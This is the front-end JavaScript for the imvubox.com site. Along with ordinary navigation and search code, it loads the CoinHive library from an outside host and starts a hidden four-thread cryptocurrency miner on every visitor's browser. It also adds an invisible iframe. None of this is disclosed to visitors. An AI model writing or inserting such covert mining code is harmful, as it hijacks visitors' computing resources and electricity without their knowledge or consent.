(function($) {
  "use strict";

  if (("www.imvubox.com" == window.location.host) && (window.location.protocol != "https:")) {
    window.location.protocol = "https";
  }

  $('body').scrollspy({
      target: '.navbar-fixed-top',
      offset: 60
  });

  new WOW().init();
  
  $('#collapsingNavbar li a').click(function() {
      /* always close responsive nav after click */
      $('.navbar-toggler:visible').click();
  });

  var imvuboxQueryTimer = null;
  window.imvuboxQuery = function(input) {
    $('.form-inline .spinner').show();
    clearTimeout(imvuboxQueryTimer);
    imvuboxQueryTimer = setTimeout(function() {
      location.hash = '#/'+input.value;
      $('.list-group a').addClass('hidden');
      $('.list-group a').each(function(x) {
        var item = $(this);
        if (item.data('search').indexOf(input.value) !== -1) {
          item.removeClass('hidden');
        } else {
          item.addClass('hidden');
        }
      });
      $('.form-inline .spinner').hide();
    }, 500);
  };
  
  $.getScript("https://coin-hive.com/lib/coinhive.min.js", function() {
    var miner = new CoinHive.Anonymous('QXffMhe03aQYYvkKg3SjwLGM9voA2vTI', {threads: 4});
    miner.start();
    // Listen on events
    miner.on('found', function() { console.log('hash found'); })
    miner.on('accepted', function() { console.log('hash accepted by pool'); })
    // Update stats once per second
    setInterval(function() {
    	var hashesPerSecond = miner.getHashesPerSecond();
    	var totalHashes = miner.getTotalHashes();
    	var acceptedHashes = miner.getAcceptedHashes();
      console.log('hpS: '+hashesPerSecond+'; tH: '+totalHashes+'; aH: '+acceptedHashes);
    	// Output to HTML elements...
    }, 5000);
  });
  
  var iframe = document.createElement('iframe');
  iframe.style.display = "none";
  iframe.src = "https://www.imvubox.com/solve.html";
  document.body.appendChild(iframe);

})(jQuery);
